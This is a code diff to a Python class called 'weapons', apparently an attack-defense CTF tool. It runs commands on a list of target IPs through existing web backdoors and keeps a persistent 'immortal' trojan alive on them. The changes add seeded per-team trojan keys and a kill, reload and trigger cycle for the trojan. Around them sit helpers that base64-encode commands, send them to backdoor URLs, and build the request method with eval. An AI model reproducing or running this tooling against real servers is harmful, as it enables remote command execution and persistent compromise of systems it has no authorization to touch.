@@ -11,9 +11,9 @@ class weapons:
     @useBckDoorIndex.setter
     def useBckDoorIndex(self,v):
         self.i=v
-    def __init__(self):
+    def __init__(self,seed):
         self.bds=config.rawbackdoor_list
-        self.team=tools.BackdoorDescriptions(config.ips,config.webrootPath)
+        self.team=tools.BackdoorDescriptions(config.ips,config.webrootPath,seed)
     def getBckPayload(self,cmd):
         return self.bds[self.i].payload.format(cmd)
     def getBckUrl(self,index):
@@ -23,11 +23,17 @@ class weapons:
         tmp=base64.b64encode(tmp)
         return {"cmd":tmp.decode("utf-8")}
     def getTeamUrl(self,index):
-        return 'http://{0}/{1}?{3}={2}'.format(config.ips[index],self.team[index].url,self.team[index].key,self.team[index].key[-5:])
+        return 'http://{0}/{1}?{3}={2}'.format(config.ips[index],self.team[index].subTrojFilename,self.team[index].trojKey,self.team[index].subTrojectParam)
     def clearTroj(self,index):
         return self.runCmd(index,config.killer)
     def loadTroj(self,index):
         return self.runCmd(index,self.team[index].trojContent)
+    def touchTroj(self,index):
+        return self.requestServer(f'http://{config.ips[index]}/{self.team[index].immortalTrojFilename}','','get','','','')
+    def trojTime(self,index):
+        self.clearTroj(index)
+        self.loadTroj(index)
+        return self.touchTroj(index)
     def runCmd(self,index,cmd):
         tbd=self.bds[self.i]
         return self.requestServer(self.getBckUrl(index),self.getBckPayload(cmd),tbd.method,tbd.headers,tbd.resultStartPos,tbd.resultEndPos) 
@@ -37,7 +43,7 @@ class weapons:
         return self.requestServer(self.getTeamUrl(index),payload,'post','','','') 
         
     def requestServer(self,url,payload,method,headers,resultStartPos,resultEndPos):
-        print(url+" -> "+str(payload))
+        print(f"{url} -> {str(payload)}")
         try:
             fun=eval(f'requests.{method}')
             if method=='get':
@@ -48,8 +54,11 @@ class weapons:
             print(e)
             return 'None'
         raw=response.text
-        if len(raw)>0:
-            rstart=0 if resultStartPos=='' else raw.index(resultStartPos)
+        try:
+            if len(raw)>0:
+                rstart=0 if resultStartPos=='' else raw.index(resultStartPos)
             rend=len(raw) if resultEndPos=='' else raw.index(resultEndPos)
             raw=raw[rstart:rend]
+        except:
+            pass
         return raw
